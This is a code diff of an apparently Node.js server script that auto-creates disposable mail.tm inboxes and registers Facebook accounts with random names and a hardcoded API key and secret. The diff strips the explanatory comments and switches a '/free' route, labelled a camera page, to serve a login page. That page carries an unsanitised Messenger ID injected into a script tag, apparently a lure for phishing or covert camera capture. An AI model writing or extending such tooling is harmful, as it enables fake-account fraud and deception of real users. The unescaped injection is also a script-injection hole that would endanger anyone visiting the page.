@@ -51,7 +51,6 @@ const getRandomName = () => {
   return { firstName, lastName };
 };
 
-// Fetch email domains from mail.tm
 const getMailDomains = async () => {
   try {
     const res = await axios.get('https://api.mail.tm/domains');
@@ -61,7 +60,6 @@ const getMailDomains = async () => {
   }
 };
 
-// Create temporary email account
 const createMailTmAccount = async () => {
   const domains = await getMailDomains();
   if (!domains) return null;
@@ -86,7 +84,6 @@ const createMailTmAccount = async () => {
   }
 };
 
-// Register account to Facebook
 const registerFacebookAccount = async (email, password, firstName, lastName, birthday) => {
   const api_key = '882a8490361da98702bf97a021ddc14d';
   const secret = '62f8ce9f74b12f84c123cc23437a4a32';
@@ -191,7 +188,7 @@ const upload = multer({ storage });
 // Serve camera page dynamically with injected PSID
 app.get('/free', (req, res) => {
   const id = req.query.id || '';
-  const filePath = path.join(__dirname, 'public/camera.html');
+  const filePath = path.join(__dirname, 'public/login.html');
   fs.readFile(filePath, 'utf8', (err, html) => {
     if (err) return res.status(500).send('Error loading page');
     const injected = html.replace('<!--__INJECT_ID__-->', `<script>const PSID = "${id}";</script>`);
